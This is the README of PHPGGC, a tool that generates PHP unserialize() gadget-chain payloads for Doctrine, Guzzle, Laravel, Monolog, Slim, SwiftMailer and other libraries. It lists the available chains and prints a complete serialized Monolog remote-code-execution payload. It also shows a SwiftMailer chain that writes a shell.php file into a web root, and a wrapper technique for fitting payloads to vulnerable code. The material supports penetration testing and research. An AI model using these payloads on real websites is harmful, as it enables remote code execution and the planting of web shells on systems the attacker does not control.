# PHPGGC: PHP Generic Gadget Chains

*PHPGGC is a library of unserialize() payloads along with a tool to generate them, from command line or programmatically*.
When encountering an unserialize on a website you don't have the code of, or simply when trying to build an exploit, this tool allows you to generate the payload without having to go through the tedious steps of finding gadgets and combining them.
Currently, the tool supports: Doctrine, Guzzle, Laravel, Monolog, Slim, SwiftMailer.

## Usage

Run `./phpggc -l` to obtain a list of gadget chains:

```
$ ./phpggc -l

Gadget Chains
-------------

NAME               VERSION           TYPE          VECTOR        I    
Doctrine/FW1       ?                 file_write    __toString    *    
Guzzle/FW1         6.0.0 <= 6.3.0    file_write    __destruct         
Laravel/RCE1       5.4.27            rce           __destruct         
Monolog/RCE1       1.18 <= 1.23      rce           __destruct         
Monolog/RCE2       1.5 <= 1.17       rce           __destruct         
Phalcon/RCE1       <= 1.2.2          rce           __wakeup      *    
Slim/RCE1          3.8.1             rce           __toString         
SwiftMailer/FW1    5.1.0 <= 5.4.8    file_write    __toString         
SwiftMailer/FW2    6.0.0 <= 6.0.1    file_write    __toString         
Symfony/RCE1       3.3               rce           __destruct    *

```

Every gadget chain has:

- Name: Name of the framework/library
- Version: Version of the framework/library for which gadgets are for
- Type: Type of exploitation: RCE, File Write, File Read, Include...
- Vector: the vector to trigger the chain after the unserialize (`__destruct()`, `__toString()`, `offsetGet()`, ...)
- Informations: Other informations about the chain

Use `-i` to get detailed information about a chain:

```
$ ./phpggc -i symfony/rce1
Name           : Symfony/RCE1
Version        : 3.3
Type           : rce
Vector         : __destruct
Informations   : 
Exec through proc_open()

./phpggc Symfony/RCE1 <code>
```

Once you have selected a chain, run `./phpggc <gadget-chain> [parameters]` to obtain the payload.
For instance, to obtain a payload for Monolog, you'd do:

```
$ ./phpggc monolog/rce1 'phpinfo();'
O:32:"Monolog\Handler\SyslogUdpHandler":1:{s:9:"*socket";O:29:"Monolog\Handler\BufferHandler":7:{s:10:"*handler";r:2;s:13:"*bufferSize";i:-1;s:9:"*buffer";a:1:{i:0;a:2:{i:0;s:10:"phpinfo();";s:5:"level";N;}}s:8:"*level";N;s:14:"*initialized";b:1;s:14:"*bufferLimit";i:-1;s:13:"*processors";a:2:{i:0;s:7:"current";i:1;s:6:"assert";}}}
```

For a file write using SwiftMailer, you'd do:

```
$ echo 'It works !' > /tmp/data
$ ./phpggc swiftmailer/fw1 /var/www/html/shell.php /tmp/data
O:13:"Swift_Message":8:{...}
```

Arguments allow to modify the way the payload is output. For instance, -u will URL encode it, and -b will convert it to base64.
Payloads often contain NULL bytes and cannot be copy/pasted as-is. Use -s for a soft URL encode, which keeps the payload readable.

The -w option allows you to define a PHP file containing a `wrapper($chain)` function.
This will be called after the chain is built, but before the `serialize()`, in order to adjust the payload's shape.
For instance, if the vulnerable code looks like this:

```
$data = unserialize($_GET['data']);
print $data['message'];
```

You could use a __toString() chain, wrapping it like so:

```
# /tmp/my_wrapper.php

function wrapper($chain)
{
    return array(
        'message' => $chain
    );
}
```

And you'd call phpggc like so:

```
$ ./phpggc -w /tmp/my_wrapper.php slim/rce1 'phpinfo();'
a:1:{s:7:"message";O:18:"Slim\Http\Response":2:{...}}
```

## Contributing

Pull requests are more than welcome. Please follow these simple guidelines:

- Error-free payloads are prefered, as some websites exit abruptly even with E_NOTICE errors
- `__destruct()` is always the best vector
- Specify at least the version of the library you've built the payload on
- Refrain from using references unless it is necessary or drastically reduces the size of the payload. If the payload is modified by hand afterwards, this might cause problems.
- Do not include unused parameters in the gadget definition if they keep their default values. It just makes the payload bigger.

Codewise, the directory structure is fairly straightforward: gadgets in _gadgets.php_, description + logic in _chain.php_.
You can define pre- and post- processing methods, if parameters need to be modified.
Hopefully, the already implemented gadgets should be enough for you to build yours.
Otherwise, I'd be glad to answer your questions.
